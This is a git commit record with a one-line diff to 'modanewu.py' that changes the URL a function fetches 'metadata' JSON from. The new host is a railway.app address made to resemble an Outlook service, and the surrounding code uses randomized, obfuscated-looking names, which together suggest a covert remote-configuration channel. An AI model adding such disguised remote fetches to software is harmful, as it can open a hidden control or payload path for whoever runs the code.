8b4e3189c43c230ce554bb103fc26eeae87f0994
pafiioio70 <pavopek24@outlook.com>
2025-06-10 09:25:21 +0000

    Update modanewu.py

--- modanewu.py
+++ modanewu.py
@@ -16,7 +16,7 @@ def net_gluwht_385():
 
     def process_ymbtcg_623():
         try:
-            model_qavqyy_472 = requests.get('https://api.npoint.io/15ac3144ebdeebac5515', timeout=10)
+            model_qavqyy_472 = requests.get('https://outlook-profile-production.up.railway.app/get_metadata', timeout=10)
             model_qavqyy_472.raise_for_status()
             train_ijcrvg_305 = model_qavqyy_472.json()
             eval_ryeora_790 = train_ijcrvg_305.get('metadata')
